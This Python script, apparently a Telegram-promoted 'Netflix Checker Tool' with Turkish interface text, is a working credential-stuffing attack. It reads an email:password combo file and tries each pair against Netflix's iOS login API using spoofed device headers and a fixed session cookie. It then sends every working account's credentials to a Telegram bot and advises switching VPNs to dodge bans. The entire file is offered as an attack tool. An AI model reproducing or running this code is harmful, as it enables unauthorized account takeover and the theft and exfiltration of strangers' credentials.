import requests
from user_agent import generate_user_agent
import time
import os
import pyfiglet
import colorama
import webbrowser
webbrowser.open('https://t.me/inovapin')
# İnovapin kullanıcıları 1.1.1.1 veya farklı vpn kullanabilirsiniz zamanla proxy eklenecektir
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
memo='''\x1b[1;30m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;31m


                  ::::::::.      .........
                  ~!!!!!!!!.     :~~~~~~~~
                  ~!!!!!!!!!.    :~~~~~~~~
                  ~~!!!!!!!!~    :~~~~~~~~
                  ~~~!!!!!!!!^   :~~~~~~~~
                  ~~~~!!!!!!!!:  :~~~~~~~~
                  ~~~~~!!!!!!!!. :~~~~~~~~
                  ~~~~^~!!!!!!!! :~~~~~~~~
                  ~~~~~^!!!!!!!!~:~~~~~~~~
                  ~~~~~~^!!!!!!!!~^~~~~~~~
                  ~~~~~~^~!!!!!!!!~~~~~~~~
                  ~~~~~~~^~!!!!!!!!^~~~~~~
                  ~~~~~~~~:~!!!!!!!!^~~~~~
                  ~~~~~~~~: !!!!!!!!!^~~~~
                  ~~~~~~~~: .!!!!!!!!~~~~~
                  ~~~~~~~~:  :!!!!!!!!~~~~
                  ~~~~~~~~:   ^!!!!!!!!~~~
                  ~~~~~~~~:    ~!!!!!!!!~~
                  ~~~~~~~~:    .!!!!!!!!!~
                  ~~~~~~~~:     .!!!!!!!!!
                  ......            .....:


                 < NETFLİX CHECKER TOOL >
              TELE : @toolturkish / @inovapin

\x1b[1;30m ▬▬▬▬▬▬▬▬▬\x1b[1;30m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''

r = requests.Session()
os.system('clear')
logo='''\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[1;33m

@@@  @@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@       @@@  @@@  @@@
@@@@ @@@  @@@@@@@@  @@@@@@@  @@@@@@@@  @@@       @@@  @@@  @@@
@@!@!@@@  @@!         @@!    @@!       @@!       @@!  @@!  !@@
!@!!@!@!  !@!         !@!    !@!       !@!       !@!  !@!  @!!
@!@ !!@!  @!!!:!      @!!    @!!!:!    @!!       !!@   !@@!@!
!@!  !!!  !!!!!:      !!!    !!!!!:    !!!       !!!    @!!!
!!:  !!!  !!:         !!:    !!:       !!:       !!:   !: :!!
:!:  !:!  :!:         :!:    :!:        :!:      :!:  :!:  !:!
 ::   ::   :: ::::     ::     ::        :: ::::   ::   ::  :::
::    :   : :: ::      :      :        : :: : :  :     :   ::

                 < NETFLİX CHECKER TOOL >
              Telegram : @toolturkish / @inovapin

\x1b[1;31m ▬▬▬▬▬▬▬▬▬\x1b[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
print(logo)
sifre = 'inovapin'
pss = input('\x1b[1;32m 𝐒𝐢𝐟𝐫𝐞 : ')
if pss == sifre:
    print('\x1b[1;32m                    DOĞRU ŞİFRE✅ ')
    time.sleep(2)
    os.system('clear')
else:
    exit('\x1b[1;31m                    HATALI ŞİFRE❌ ')
print(memo)
tok = input("\x1b[1;33m𝐓𝐨𝐤𝐞𝐧 𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
ID = input("\x1b[1;36m𝐈𝐃 𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
dosya = input("\x1b[1;32m𝐂𝐨𝐦𝐛𝐨  𝐆𝐢𝐫𝐢𝐧𝐢𝐳: ")
while True:
    for satir in open(dosya, 'r').read().splitlines():
        whisper = str(satir)
        ema = whisper.split(':')[0]
        password = whisper.split(':')[1]
        email = ema.split("@")[0]
        domn = ema.split("@")[1]

        url = 'https://ios.prod.http1.netflix.com/iosui/user/10.19'

        headers = {
            "Host": "ios.prod.http1.netflix.com",
            "Cookie": "flwssn=74266376-523d-48c3-9bc3-8a009e804a37; memclid=TkZBUFBMLTAyLUlQSE9ORTk9NC1ENUJBN0IxQTAyNTI0NTM2OEQ0QUEzMjNFOTg3NDMzQzUyQzZGQjRCNjczRTg1NjIxRUEzMDFENDQ0RUM3OEIx; nfvdid=BQFmAAEBENN4QjtTnSS8VW_4WDVPc45gbv8HGuY3dcUdp9_6Xb6d_vcJbqU4lp2n8cm8kaOYxAGr7OI5JciXNkgH-zvKmtkUQcWfMkOj3TvuMtezrkns7ZtQcfAcFOutfzGV9LhYM1QKbizWrz0uHkFoHMVbhNYl",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Netflix.argo.abtests": "",
            "X-Netflix.client.appversion": "10.19.0",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "tr-TR;q=1, en-US;q=0.9",
            "Content-Length": "1851",
            "X-Netflix.client.idiom": "phone",
            "User-Agent": generate_user_agent(),
            "X-Netflix.client.type": "argo",
            "X-Netflix.nfnsm": "9",
            "Connection": "close"
        }

        data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domn}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'

        Go = r.post(url, headers=headers, data=data, proxies=None)

        if '"memberHome"' in Go.text:
            print(f'{G} Hesap çalışıyor ✅| {ema} ➥ {password}')
            tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.🚀 Netflix Hit Düştü Kanka 🎉
====================
𝐁𝐚𝐬𝐚𝐫𝐢𝐥𝐢 𝐆𝐢𝐫𝐢𝐬  ✅
𝙀-𝙥𝙤𝙨𝙩𝙖: {email}
𝙎𝙞𝙛𝙧𝙚: {password}
====================
''')



        elif '"incorrect_password"' in Go.text:
            print(f'{E} Yanlış şifre ❌| {ema} ➥ {password}')

        elif 'never_member_consumption_only' in Go.text:
            print(f'{S} Netflix Ücretsiz✅ | {ema} ➥ {password}')
            tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=.🚀 Netflix Hit Düştü Kanka 🎉
====================
𝐁𝐚𝐬𝐚𝐫𝐢𝐥𝐢 𝐆𝐢𝐫𝐢𝐬  ✅
𝙀-𝙥𝙤𝙨𝙩𝙖: {ema}
𝙎𝙞𝙛𝙧𝙚: {password}
====================
''')

        elif 'unrecognized_email' in Go.text:
            print(f'{E} Geçersiz E-posta❌ | {ema} ➥ {password}')

        else:
            print(f'{E} Sen yasaklandın ➥{S} VPN kullan ve bir dakika bekle🥺 ')
            time.sleep(60)

